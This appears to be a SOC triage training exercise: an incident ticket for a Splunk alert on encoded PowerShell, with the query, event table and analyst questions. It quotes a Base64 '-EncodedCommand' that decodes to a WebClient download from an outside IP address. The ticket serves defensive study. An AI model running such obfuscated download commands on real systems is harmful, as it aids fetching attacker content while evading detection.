# Case 001 — Encoded PowerShell Execution

**Incident ID:** IR-2026-017
**Date Detected:** 2026-07-02
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (Splunk Alert)
**Status:** 🔴 Open — Pending Triage

---

## 🎫 Alert Summary

| Field | Value |
|---|---|
| EventCode | 4688 (Process Creation) |
| Process | powershell.exe |
| Account | hp |
| Computer | JIMIL-JOSHI |
| Trigger | `-EncodedCommand` flag detected in Process_Command_Line |
| Event Count | 3 events within ~1.4 seconds |

---

## 📄 Raw Event Data

**SPL Query Used:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*powershell.exe" Process_Command_Line="*EncodedCommand*"
| table _time, ComputerName, Account_Name, New_Process_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Results (3 events):**

| _time | ComputerName | Account_Name | New_Process_Name | Creator_Process_Name |
|---|---|---|---|---|
| 2026-07-02 15:45:12.401 | JIMIL-JOSHI | hp | C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe | (empty) |
| 2026-07-02 15:45:12.215 | JIMIL-JOSHI | hp | C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe | (empty) |
| 2026-07-02 15:45:11.041 | JIMIL-JOSHI | hp | C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe | (empty) |

**Process_Command_Line (truncated):**
```
"C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand JABzAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMwA5AC4ANQA5AC4AMQA0ADgALgAxADAAMAAvAHQAZQBzAHQALgB0AHgAdAAnACkAOwBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACQAcwA=
```

---

## 🎯 Task

Triage this alert. Determine:
1. Is this TP / FP / Ambiguous?
2. What is the encoded command actually doing?
3. What additional context is missing (parent process, account context)?
4. What is your final verdict and justification?
